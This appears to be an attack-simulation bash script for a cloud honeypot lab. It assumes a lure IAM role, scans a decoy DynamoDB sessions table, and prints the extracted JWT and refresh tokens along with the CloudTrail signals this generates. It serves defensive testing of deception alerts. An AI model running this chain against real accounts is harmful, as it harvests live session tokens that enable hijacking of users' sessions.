#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 12 (DynamoDB Active Sessions Lure)
#
# This script walks through the attack chain step by step:
#   Assume role → list tables → scan sessions → extract JWT tokens
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 12 — ABUSE CHAIN"
echo "  DynamoDB Fake Active Sessions"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: session-store-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/session-store-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session-store" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing DynamoDB tables (dynamodb:ListTables)"
# ---------------------------------------------------------------
attack "dynamodb:ListTables"
aws dynamodb list-tables --region us-west-2 --output table
info "Target table identified: prod-active-sessions"

# ---------------------------------------------------------------
step "4" "Scanning all session records (dynamodb:Scan)"
# ---------------------------------------------------------------
attack "dynamodb:Scan → prod-active-sessions"
SCAN_RESULT=$(aws dynamodb scan \
  --table-name "prod-active-sessions" \
  --region us-west-2 \
  --output json)

ITEM_COUNT=$(echo "$SCAN_RESULT" | jq '.Count')
info "Retrieved ${ITEM_COUNT} active session records"

# ---------------------------------------------------------------
step "5" "Extracting session metadata"
# ---------------------------------------------------------------
echo ""
echo -e "${YELLOW}--- Active Sessions ---${NC}"
echo "$SCAN_RESULT" | jq -r '.Items[] | "  [\(.session_id.S)] user: \(.user_id.S) | ip: \(.ip_address.S) | login: \(.login_timestamp.S)"'

# ---------------------------------------------------------------
step "6" "Extracting JWT tokens for session hijacking"
# ---------------------------------------------------------------
echo ""
echo -e "${YELLOW}--- Extracted JWT Tokens ---${NC}"
echo "$SCAN_RESULT" | jq -r '.Items[] | "  [\(.user_id.S)] jwt: \(.jwt_token.S[:80])..."'

echo ""
echo -e "${YELLOW}--- Extracted Refresh Tokens ---${NC}"
echo "$SCAN_RESULT" | jq -r '.Items[] | "  [\(.user_id.S)] refresh: \(.refresh_token.S)"'

echo ""
warn "Extracted ${ITEM_COUNT} JWT tokens and refresh tokens for potential session hijacking"

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on session-store-readonly-role"
echo "  • CloudTrail: ListTables"
echo "  • CloudTrail: Scan on prod-active-sessions"
echo ""
echo -e "${YELLOW}Attacker next steps (all detectable):${NC}"
echo "  • Attempt to use JWT tokens against internal APIs"
echo "  • Attempt to use refresh tokens to generate new sessions"
echo "  • Attempt session hijacking with extracted IP/user-agent pairs"
echo ""
